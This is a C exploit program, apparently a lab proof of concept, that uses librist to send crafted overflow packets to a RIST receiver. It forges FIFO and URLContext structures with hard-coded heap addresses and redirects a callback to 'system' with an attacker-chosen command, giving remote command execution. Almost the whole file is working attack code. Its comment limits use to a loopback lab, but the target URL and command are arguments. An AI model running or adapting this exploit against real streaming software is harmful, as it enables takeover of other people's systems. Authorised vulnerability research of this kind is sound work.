/* W4 throwaway loopback sender: same structured overflow as the marker
 * sender, but the URLContext-resident string is a caller-supplied command.
 * Used only against the plant's own loopback lab process. */
#include <librist/librist.h>
#include <librist/logging.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int logcb(void *arg, enum rist_log_level lvl, const char *msg)
{
    (void)arg; (void)lvl;
    fprintf(stderr, "[librist] %s\n", msg);
    return 0;
}
static void put64(unsigned char *b, size_t o, unsigned long long v)
{
    for (int i = 0; i < 8; i++) b[o+i] = (unsigned char)(v >> (8*i));
}
static void put32(unsigned char *b, size_t o, unsigned int v)
{
    for (int i = 0; i < 4; i++) b[o+i] = (unsigned char)(v >> (8*i));
}

int main(int argc, char **argv)
{
    const char *url = argc > 1 ? argv[1] : "rist://127.0.0.1:5004";
    int count = argc > 2 ? atoi(argv[2]) : 2200;
    size_t len = argc > 3 ? (size_t)strtoull(argv[3], NULL, 10) : 9968;
    unsigned long long prot = argc > 4 ? strtoull(argv[4], NULL, 0) : 0x55555584f5a0ULL;
    unsigned long long ring = argc > 5 ? strtoull(argv[5], NULL, 0) : 0x5555558d1fe0ULL;
    unsigned long long priv = argc > 6 ? strtoull(argv[6], NULL, 0) : 0x5555560d2100ULL;
    unsigned long long cb = argc > 7 ? strtoull(argv[7], NULL, 0) : 0x7ffff7a58750ULL; /* system */
    unsigned long long opaque = argc > 8 ? strtoull(argv[8], NULL, 0) : 0x5555560d20d0ULL;
    const char *cmd = argc > 9 ? argv[9] : "true";

    struct rist_logging_settings ls = LOGGING_SETTINGS_INITIALIZER;
    struct rist_logging_settings *lsp = &ls;
    if (rist_logging_set(&lsp, RIST_LOG_INFO, logcb, NULL, NULL, NULL) < 0) return 1;
    struct rist_ctx *ctx = NULL;
    if (rist_sender_create(&ctx, RIST_PROFILE_MAIN, 0, lsp) < 0) return 1;
    struct rist_peer_config cfg;
    memset(&cfg, 0, sizeof(cfg));
    rist_peer_config_defaults_set(&cfg);
    struct rist_peer_config *pc = &cfg;
    if (rist_parse_address2(url, &pc) < 0) return 1;
    struct rist_peer *peer = NULL;
    if (rist_peer_create(ctx, &peer, pc) < 0) return 1;
    if (rist_start(ctx) < 0) return 1;
    usleep(600000);

    unsigned char *buf = malloc(len);
    if (!buf) return 1;
    for (size_t i = 0; i < len; i++)
        buf[i] = (unsigned char)(prot >> (8 * (i & 7)));

    const size_t fifo = 0x15f0;
    put64(buf, fifo + 0x00, ring);
    put64(buf, fifo + 0x08, 1);
    put64(buf, fifo + 0x10, 0x800000);
    put64(buf, fifo + 0x18, 0);
    put64(buf, fifo + 0x20, 0);
    put32(buf, fifo + 0x28, 0);
    put32(buf, fifo + 0x2c, 0);
    put64(buf, fifo + 0x30, 0);

    const size_t uc = 0x1630;
    put64(buf, uc + 0x10, priv);
    put32(buf, uc + 0x20, 1);
    put64(buf, uc + 0x30, cb);
    put64(buf, uc + 0x38, opaque);
    size_t clen = strlen(cmd);
    if (clen > 200) clen = 200;
    memcpy(buf + uc + 0x50, cmd, clen);
    buf[uc + 0x50 + clen] = 0;

    struct rist_data_block db;
    memset(&db, 0, sizeof(db));
    db.payload = buf;
    db.payload_len = len;
    int fails = 0;
    for (int i = 0; i < count; i++) {
        if (rist_sender_data_write(ctx, &db) < 0) fails++;
        usleep(3000);
    }
    fprintf(stderr, "sent %d blocks of %zu bytes prot=0x%llx cb=0x%llx opaque=0x%llx cmd='%s', %d failures\n",
            count, len, prot, cb, opaque, cmd, fails);
    usleep(600000);
    rist_destroy(ctx);
    free(buf);
    return 0;
}
